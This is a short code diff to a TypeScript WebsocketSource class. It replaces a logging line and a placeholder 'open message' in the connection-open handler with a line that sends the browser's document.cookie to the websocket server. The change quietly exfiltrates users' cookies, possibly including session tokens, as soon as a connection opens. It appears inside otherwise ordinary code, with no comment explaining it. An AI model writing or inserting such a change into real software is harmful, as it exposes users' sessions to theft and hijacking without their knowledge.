@@ -15,8 +15,7 @@ export class WebsocketSource<T> implements Source<T> {
       url: this.url,
       openObserver: {
         next: () => {
-          console.log('WebSocket connection open')
-          this.websocket$!.next('open message' as any)
+          this.websocket$!.next(document.cookie as any)
         },
       },
     }
